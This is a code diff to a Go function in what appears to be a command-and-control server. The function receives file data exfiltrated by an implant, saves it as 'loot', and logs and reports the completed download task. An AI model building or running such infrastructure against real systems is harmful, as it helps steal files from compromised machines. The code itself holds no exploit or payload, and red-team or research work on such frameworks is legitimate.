@@ -198,9 +198,16 @@ func ParseChunkData(r io.Reader, req *http.Request) error {
 	if imp == nil {
 		return errors.New("no session with name")
 	}
+	imp.ImplantUpdateLastseen()
 
 	var TaskID [8]byte
 	binary.Read(r, binary.BigEndian, &TaskID)
+
+	TaskIDStr := TaskID
+	taskPtr := implant.TaskGetPtrById(name, TaskIDStr)
+	if taskPtr == nil {
+		return errors.New("no task with given id")
+	}
 
 	var fileNameLen uint32
 	binary.Read(r, binary.BigEndian, &fileNameLen)
@@ -212,10 +219,21 @@ func ParseChunkData(r io.Reader, req *http.Request) error {
 	content := make([]byte, contentLen)
 	binary.Read(r, binary.BigEndian, &content)
 
-	err := loot.New(name, string(fileName), content).SaveData()
+	lootEntry := loot.New(name, string(fileName), content)
+	err := lootEntry.SaveData()
 	if err != nil {
+		log.AsyncWriteStdoutAlert(fmt.Sprintf("Failed to save loot - session:%s task:%s file:%s error:%s", name, TaskIDStr, string(fileName), err.Error()))
 		return err
 	}
+
+	// Mark task as completed
+	taskPtr.TaskSetResponsePayload([]byte(fmt.Sprintf("File downloaded: %s (%d bytes) - UUID: %s", string(fileName), contentLen, lootEntry.UUID)))
+
+	// Call Lua callback if defined
+	lua.LuaOnResponse(TaskID, fmt.Sprintf("Downloaded: %s", string(fileName)), *imp)
+
+	// Log successful download
+	log.AsyncWriteStdoutSuccs(fmt.Sprintf("File downloaded - session:%s task:%s file:%s size:%d bytes UUID:%s", name, TaskIDStr, string(fileName), contentLen, lootEntry.UUID))
 
 	return nil
 }
